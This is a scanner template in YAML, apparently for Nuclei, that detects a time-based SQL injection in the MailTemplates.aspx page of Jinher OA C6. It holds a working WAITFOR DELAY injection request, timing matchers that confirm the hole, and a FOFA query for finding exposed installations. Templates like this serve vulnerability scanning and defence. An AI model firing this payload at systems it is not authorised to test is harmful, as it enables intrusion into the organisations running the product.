id: poc-yaml-jinher-oa-jc6-mailtemplates-aspx-sqli
info:
  name: 金和OA C6 MailTemplates.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    affected_product: 金和OA 协同办公管理系统
    fofa_query: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - method: GET
    path:
      - '{{BaseURL}}/C6/JHSoft.Web.Mail/MailTemplates.aspx/?tempID=1;WAITFOR+DELAY+%270:0:{{t1}}%27--'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "JhWebOfficeControl"
          - "JHSoft"
        part: body
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
